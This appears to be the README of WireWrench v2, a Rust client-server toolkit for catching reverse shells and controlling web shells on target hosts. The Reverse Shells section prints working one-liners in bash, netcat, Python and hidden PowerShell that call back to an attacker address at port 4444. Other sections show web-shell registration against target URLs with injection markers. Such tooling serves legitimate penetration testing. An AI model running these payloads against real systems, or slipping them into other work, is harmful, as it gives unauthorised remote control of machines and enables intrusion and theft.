# WireWrench v2

> **A remote shell toolkit** — catch reverse shells, interact with web shells, manage sessions.

WireWrench v2 is a complete rework of the original web-shell REPL into a full client-server remote shell toolkit.

## Architecture

```
┌─────────────────┐     Unix Socket      ┌──────────────────┐
│   ww (client)   │ ◄─────────────────► │  ww-server (daemon)│
│                 │    JSON over socket  │                  │
│  • list shells  │                      │  • TCP listener  │
│  • send cmd     │                      │  • Web shells    │
│  • interact     │                      │  • Session mgmt  │
│  • script file  │                      │  • Unix socket   │
│  • register web │                      └──────────────────┘
└─────────────────┘
```

## Quick Start

```bash
# 1. Start the server (listens for reverse shells on :4444)
ww-server

# 2. From a target machine, send a reverse shell back:
#    (adjust IP and port to match your setup)
target$ bash -c 'exec bash -i &>/dev/tcp/10.0.0.5/4444 0>&1'

# 3. The server catches it — list active shells
ww list

# 4. Send a command
ww send 1 "whoami"
ww send 1 "id"

# 5. Interactive mode (Ctrl+C to detach, shell stays alive)
ww interact 1

# 6. Or register a web shell instead
ww web https://target.com/shell.php?cmd=BLUB

# 7. Run commands from a script file
ww script 1 commands.txt
```

## Installation

```bash
cargo install wirewrench
```

Or build from source:

```bash
git clone https://github.com/amrosia/wirewrench
cd wirewrench
cargo build --release
```

## Usage

### Server

```bash
ww-server                    # default: :4444, socket at /tmp/wirewrench.sock
ww-server -p 5555            # custom TCP port
ww-server -H 0.0.0.0 -p 8080 # custom host and port
ww-server -s /tmp/ww.sock    # custom socket path
```

### Client

```bash
# List active shells
ww list

# Send a command to a shell
ww send 1 "uname -a"

# Interactive shell session (Ctrl+C to detach, shell stays alive)
ww interact 1

# Run commands from a file (lines starting with # are skipped)
ww script 1 payloads.txt

# Register a web shell (curl-like flags)
ww web -X POST -d "cmd=BLUB" -H "X-Custom: value" https://target.com/shell.php

# Close/kill a shell
ww close 1

# Use a custom socket path
ww -s /tmp/ww.sock list
```

### Reverse Shells

WireWrench catches plain TCP reverse shells — no special payload needed.

1. **Start the server** on your attack machine:
   ```bash
   ww-server
   ```

2. **Send a reverse shell** from the target using any standard one-liner:
   ```bash
   # Bash
   target$ bash -c 'exec bash -i &>/dev/tcp/10.0.0.5/4444 0>&1'

   # Netcat (traditional)
   target$ nc -e /bin/sh 10.0.0.5 4444

   # Netcat (OpenBSD)
   target$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.5 4444 > /tmp/f

   # Python
   target$ python3 -c 'import socket,subprocess;s=socket.socket();s.connect(("10.0.0.5",4444));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'

   # PowerShell
   target> powershell -NoP -NonI -W Hidden -Exec Bypass -C "$c=New-Object System.Net.Sockets.TCPClient('10.0.0.5',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb + 'PS ' + (pwd).Path + '> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()"
   ```

3. **The server logs the catch** and assigns a session ID — use the client to interact:
   ```bash
   ww list
   ww interact 1
   ww send 1 "id"
   ```

### Web Shell Registration

The `ww web` command registers a URL-injection-based web shell with the server. Commands are sent through the server, which handles injection and response parsing.

```bash
# Basic GET-based web shell
ww web https://target.com/shell.php?cmd=BLUB

# POST with body injection
ww web -X POST -d "cmd=BLUB" https://target.com/shell.php

# Custom injection point
ww web -i INJECT https://target.com/panel.php?exec=INJECT

# With custom headers and cookies
ww web -H "Authorization: Bearer xyz" -b "session=abc123" https://target.com/shell.php
```

Flags:

| Flag | Description |
|------|-------------|
| `-X` / `--request` | HTTP method (default: GET) |
| `-d` / `--data` | Request body / POST data |
| `-H` / `--header` | Additional HTTP header (repeatable) |
| `-b` / `--cookie` | Cookie string |
| `-i` / `--injection_point` | Injection marker (default: BLUB) |

## Features

- **TCP reverse shell catching** — built-in listener for incoming reverse shells
- **Web shell management** — register and interact with URL-injection-based web shells
- **Interactive mode** — full raw terminal, line editing, word navigation, Ctrl+C detach
- **Scripting** — run command lists from files with comment support
- **Session persistence** — shells stay alive when you detach from interactive mode
- **JSON-over-Unix-socket API** — extensible control protocol

## Changelog

See [CHANGELOG.md](CHANGELOG.md) for version history.

## License

AGPL-3.0-or-later
